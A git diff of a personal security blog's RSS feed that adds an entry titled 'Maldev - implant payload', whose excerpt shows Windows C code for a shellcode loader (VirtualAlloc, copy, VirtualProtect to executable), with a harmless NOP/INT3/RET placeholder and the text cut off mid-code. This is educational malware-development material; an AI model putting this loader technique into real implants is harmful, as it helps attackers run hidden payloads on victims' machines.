@@ -10,7 +10,18 @@
     </image>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja-JP</language>
-    <lastBuildDate>Wed, 10 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://famasoon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Sun, 28 May 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://famasoon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Maldev - implant payload</title>
+      <link>https://famasoon.github.io/posts/implantpayload/</link>
+      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://famasoon.github.io/posts/implantpayload/</guid>
+      <description>Shellcode One way for malware to embed code is to deploy shell code in memory. This time, we will check the method that works on Windows. Note that getchar() is used so that the debugger can attach to the process accordingly and check the memory.
+.text payload is the shellcode. To embed arbitrary shell code in a .text section, do the following.
+#include &amp;lt;windows.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(void) { void * exec_mem; BOOL rv; HANDLE th; DWORD oldprotect = 0; // Shellcode in text section unsigned char payload[] = { 0x90,	// NOP 0x90,	// NOP 0xcc,	// INT3 0xc3	// RET }; unsigned int payload_len = 4; // Allocate a memory buffer for payload exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); printf(&amp;#34;%-20s : 0x%-016p\n&amp;#34;, &amp;#34;payload addr&amp;#34;, (void *)payload); printf(&amp;#34;%-20s : 0x%-016p\n&amp;#34;, &amp;#34;exec_mem addr&amp;#34;, (void *)exec_mem); // Copy payload to new buffer RtlMoveMemory(exec_mem, payload, payload_len); // Make new buffer as executable rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &amp;amp;oldprotect); printf(&amp;#34;\nHit me!</description>
+    </item>
+    
     <item>
       <title>HackTheBox Walkthrough - Brainf**k</title>
       <link>https://famasoon.github.io/posts/brainfuck/</link>
